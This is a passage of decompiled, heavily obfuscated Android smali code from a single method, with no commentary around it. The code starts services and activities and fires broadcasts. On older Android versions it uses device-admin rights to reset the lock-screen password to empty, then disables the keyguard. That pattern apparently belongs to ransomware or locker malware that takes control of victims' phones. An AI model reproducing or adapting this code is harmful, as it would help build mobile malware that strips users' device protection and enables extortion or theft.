    :try_start_b
    iput-boolean v1, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->m:Z

    invoke-direct {p0}, Lzvy/zpfypq/bbuhtkwvaf/w;->b()V
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_b

    :cond_5
    :goto_1
    new-instance v1, Landroid/content/Intent;

    iget-object v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v4}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    const-class v5, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;

    invoke-direct {v1, v4, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    if-nez v0, :cond_6

    :try_start_c
    iget-boolean v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->e:Z
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_c

    if-eqz v4, :cond_6

    :try_start_d
    sget-boolean v4, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->d:Z
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_d

    if-eqz v4, :cond_6

    :try_start_e
    iget-boolean v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->l:Z
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_e

    if-nez v4, :cond_6

    :try_start_f
    iget-boolean v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->a:Z
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_f

    if-nez v4, :cond_6

    const/4 v4, 0x1

    :try_start_10
    iput-boolean v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->a:Z

    iget-object v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v4, v1}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    iget-object v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    iget-object v4, v4, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->c:[I

    const/4 v5, 0x0

    const/16 v6, 0xc8

    aput v6, v4, v5

    invoke-direct {p0, v1}, Lzvy/zpfypq/bbuhtkwvaf/w;->b(Landroid/content/Intent;)V
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_10

    :cond_6
    iget-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v1}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {p0, v1}, Lzvy/zpfypq/bbuhtkwvaf/w;->a(Landroid/content/Context;)Z

    move-result v1

    :try_start_11
    iget-boolean v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->e:Z
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_11

    if-eqz v4, :cond_7

    if-eqz v0, :cond_7

    if-nez v2, :cond_7

    :try_start_12
    sget-boolean v4, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->d:Z
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_13

    if-eqz v4, :cond_7

    const/4 v4, 0x0

    :try_start_13
    iput-boolean v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->a:Z
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_14

    if-nez v1, :cond_7

    new-instance v1, Landroid/content/Intent;

    iget-object v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v4}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    const-class v5, Lzvy/zpfypq/bbuhtkwvaf/lllllIllllllllIIlllllIlLIlIIILllIlIlIlllILIIlIllIlIIlIIL;

    invoke-direct {v1, v4, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v1, v13}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v4, v1}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->startActivity(Landroid/content/Intent;)V

    :cond_7
    :try_start_14
    iget-boolean v1, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->e:Z
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_15

    if-eqz v1, :cond_8

    if-eqz v0, :cond_8

    if-eqz v2, :cond_8

    :try_start_15
    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/w;->a()Z
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_17

    move-result v1

    if-nez v1, :cond_8

    :try_start_16
    sget-boolean v1, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->d:Z
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_18

    if-eqz v1, :cond_8

    :try_start_17
    iget-boolean v1, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->l:Z
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_19

    if-nez v1, :cond_8

    iget-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v1}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {p0, v1}, Lzvy/zpfypq/bbuhtkwvaf/w;->a(Landroid/content/Context;)V

    new-instance v1, Landroid/content/Intent;

    sget-object v4, Lzvy/zpfypq/bbuhtkwvaf/w;->d:[Ljava/lang/String;

    const/4 v5, 0x5

    aget-object v4, v4, v5

    invoke-direct {v1, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    iget-object v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v4, v1}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->sendBroadcast(Landroid/content/Intent;)V

    :cond_8
    if-nez v0, :cond_9

    :try_start_18
    iget-boolean v1, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->l:Z
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_1a

    if-eqz v1, :cond_9

    if-eqz v2, :cond_9

    :try_start_19
    sget-boolean v1, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->d:Z
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_1c

    if-eqz v1, :cond_9

    :try_start_1a
    iget-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    iget-boolean v1, v1, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->h:Z
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_1d

    if-nez v1, :cond_9

    :try_start_1b
    iget-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    const/4 v4, 0x1

    iput-boolean v4, v1, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->h:Z

    new-instance v1, Lzvy/zpfypq/bbuhtkwvaf/y;

    invoke-direct {v1}, Lzvy/zpfypq/bbuhtkwvaf/y;-><init>()V

    const/4 v4, 0x1

    new-array v4, v4, [Landroid/content/Context;

    const/4 v5, 0x0

    iget-object v6, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v6}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getApplicationContext()Landroid/content/Context;

    move-result-object v6

    aput-object v6, v4, v5

    invoke-virtual {v1, v4}, Lzvy/zpfypq/bbuhtkwvaf/y;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_1b
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_1b} :catch_1e

    :cond_9
    :try_start_1c
    iget-boolean v1, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->e:Z
    :try_end_1c
    .catch Ljava/lang/Exception; {:try_start_1c .. :try_end_1c} :catch_1f

    if-eqz v1, :cond_d

    if-eqz v0, :cond_d

    if-eqz v2, :cond_d

    :try_start_1d
    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/w;->a()Z
    :try_end_1d
    .catch Ljava/lang/Exception; {:try_start_1d .. :try_end_1d} :catch_21

    move-result v0

    if-eqz v0, :cond_d

    :try_start_1e
    sget-boolean v0, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->d:Z
    :try_end_1e
    .catch Ljava/lang/Exception; {:try_start_1e .. :try_end_1e} :catch_22

    if-eqz v0, :cond_d

    :try_start_1f
    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    iget-boolean v0, v0, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->k:Z
    :try_end_1f
    .catch Ljava/lang/Exception; {:try_start_1f .. :try_end_1f} :catch_23

    if-eqz v0, :cond_a

    :try_start_20
    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v0, v3}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->stopService(Landroid/content/Intent;)Z

    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    const/4 v1, 0x0

    iput-boolean v1, v0, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->k:Z
    :try_end_20
    .catch Ljava/lang/Exception; {:try_start_20 .. :try_end_20} :catch_24

    :cond_a
    :try_start_21
    iget-boolean v0, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->k:Z

    if-nez v0, :cond_c

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
    :try_end_21
    .catch Ljava/lang/Exception; {:try_start_21 .. :try_end_21} :catch_25

    const/16 v1, 0x18

    if-ge v0, v1, :cond_b

    :try_start_22
    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/w;->d:[Ljava/lang/String;

    const/4 v2, 0x4

    aget-object v1, v1, v2

    invoke-virtual {v0, v1}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    const-string v1, ""

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/app/admin/DevicePolicyManager;->resetPassword(Ljava/lang/String;I)Z
    :try_end_22
    .catch Ljava/lang/Exception; {:try_start_22 .. :try_end_22} :catch_26

    :cond_b
    iput-boolean v11, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->k:Z

    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/w;->d:[Ljava/lang/String;

    aget-object v1, v1, v11

    invoke-virtual {v0, v1}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/KeyguardManager;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/w;->d:[Ljava/lang/String;

    const/4 v2, 0x7

    aget-object v1, v1, v2

    invoke-virtual {v0, v1}, Landroid/app/KeyguardManager;->newKeyguardLock(Ljava/lang/String;)Landroid/app/KeyguardManager$KeyguardLock;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/KeyguardManager$KeyguardLock;->disableKeyguard()V

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v1}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v13}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v1, v0}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->startActivity(Landroid/content/Intent;)V

    :cond_c
    invoke-static {v11}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->b(Z)V

    :cond_d
    return-void

    :catch_0
    move-exception v0

    throw v0

    :catch_1
    move-exception v0

    :try_start_23
    throw v0
    :try_end_23
    .catch Ljava/lang/Exception; {:try_start_23 .. :try_end_23} :catch_2

    :catch_2
    move-exception v0

    :try_start_24
    throw v0
    :try_end_24
    .catch Ljava/lang/Exception; {:try_start_24 .. :try_end_24} :catch_3

    :catch_3
    move-exception v0

    goto/16 :goto_0

    :catch_4
    move-exception v0

    :try_start_25
    throw v0
    :try_end_25
    .catch Ljava/lang/Exception; {:try_start_25 .. :try_end_25} :catch_5

    :catch_5
    move-exception v0

    :try_start_26
    throw v0
    :try_end_26
    .catch Ljava/lang/Exception; {:try_start_26 .. :try_end_26} :catch_6

    :catch_6
    move-exception v0

    :try_start_27
    throw v0
    :try_end_27
    .catch Ljava/lang/Exception; {:try_start_27 .. :try_end_27} :catch_7

    :catch_7
    move-exception v0

    throw v0

    :catch_8
    move-exception v0

    :try_start_28
    throw v0
    :try_end_28
    .catch Ljava/lang/Exception; {:try_start_28 .. :try_end_28} :catch_9

    :catch_9
    move-exception v0

    throw v0

    :catch_a
    move-exception v0

    :try_start_29
    throw v0
    :try_end_29
    .catch Ljava/lang/Exception; {:try_start_29 .. :try_end_29} :catch_b

    :catch_b
    move-exception v0

    throw v0

    :catch_c
    move-exception v0

    :try_start_2a
    throw v0
    :try_end_2a
    .catch Ljava/lang/Exception; {:try_start_2a .. :try_end_2a} :catch_d

    :catch_d
    move-exception v0

    :try_start_2b
    throw v0
    :try_end_2b
    .catch Ljava/lang/Exception; {:try_start_2b .. :try_end_2b} :catch_e

    :catch_e
    move-exception v0

    :try_start_2c
    throw v0
    :try_end_2c
    .catch Ljava/lang/Exception; {:try_start_2c .. :try_end_2c} :catch_f

    :catch_f
    move-exception v0

    :try_start_2d
    throw v0
    :try_end_2d
    .catch Ljava/lang/Exception; {:try_start_2d .. :try_end_2d} :catch_10

    :catch_10
    move-exception v0

    throw v0

    :catch_11
    move-exception v0

    :try_start_2e
    throw v0
    :try_end_2e
    .catch Ljava/lang/Exception; {:try_start_2e .. :try_end_2e} :catch_12

    :catch_12
    move-exception v0

    :try_start_2f
    throw v0
    :try_end_2f
    .catch Ljava/lang/Exception; {:try_start_2f .. :try_end_2f} :catch_13

    :catch_13
    move-exception v0

    :try_start_30
    throw v0
    :try_end_30
    .catch Ljava/lang/Exception; {:try_start_30 .. :try_end_30} :catch_14

    :catch_14
    move-exception v0

    throw v0

    :catch_15
    move-exception v0

    :try_start_31
    throw v0
    :try_end_31
    .catch Ljava/lang/Exception; {:try_start_31 .. :try_end_31} :catch_16

    :catch_16
    move-exception v0

    :try_start_32
    throw v0
    :try_end_32
    .catch Ljava/lang/Exception; {:try_start_32 .. :try_end_32} :catch_17

    :catch_17
    move-exception v0

    :try_start_33
    throw v0
    :try_end_33
    .catch Ljava/lang/Exception; {:try_start_33 .. :try_end_33} :catch_18

    :catch_18
    move-exception v0

    :try_start_34
    throw v0
    :try_end_34
    .catch Ljava/lang/Exception; {:try_start_34 .. :try_end_34} :catch_19

    :catch_19
    move-exception v0

    throw v0

    :catch_1a
    move-exception v0

    :try_start_35
    throw v0
    :try_end_35
    .catch Ljava/lang/Exception; {:try_start_35 .. :try_end_35} :catch_1b

    :catch_1b
    move-exception v0

    :try_start_36
    throw v0
    :try_end_36
    .catch Ljava/lang/Exception; {:try_start_36 .. :try_end_36} :catch_1c

    :catch_1c
    move-exception v0

    :try_start_37
    throw v0
    :try_end_37
    .catch Ljava/lang/Exception; {:try_start_37 .. :try_end_37} :catch_1d

    :catch_1d
    move-exception v0

    :try_start_38
    throw v0
    :try_end_38
    .catch Ljava/lang/Exception; {:try_start_38 .. :try_end_38} :catch_1e

    :catch_1e
    move-exception v0

    throw v0

    :catch_1f
    move-exception v0

    :try_start_39
    throw v0
    :try_end_39
    .catch Ljava/lang/Exception; {:try_start_39 .. :try_end_39} :catch_20

    :catch_20
    move-exception v0

    :try_start_3a
    throw v0
    :try_end_3a
    .catch Ljava/lang/Exception; {:try_start_3a .. :try_end_3a} :catch_21

    :catch_21
    move-exception v0

    :try_start_3b
    throw v0
    :try_end_3b
    .catch Ljava/lang/Exception; {:try_start_3b .. :try_end_3b} :catch_22

    :catch_22
    move-exception v0

    :try_start_3c
    throw v0
    :try_end_3c
    .catch Ljava/lang/Exception; {:try_start_3c .. :try_end_3c} :catch_23

    :catch_23
    move-exception v0

    :try_start_3d
    throw v0
    :try_end_3d
    .catch Ljava/lang/Exception; {:try_start_3d .. :try_end_3d} :catch_24

    :catch_24
    move-exception v0

    throw v0

    :catch_25
    move-exception v0

    :try_start_3e
    throw v0
    :try_end_3e
    .catch Ljava/lang/Exception; {:try_start_3e .. :try_end_3e} :catch_26

    :catch_26
    move-exception v0

    throw v0

    :cond_e
    iput-boolean v12, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->m:Z

    if-eqz v1, :cond_5

    :cond_f
    iput-boolean v11, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->e:Z

    goto/16 :goto_1
.end method
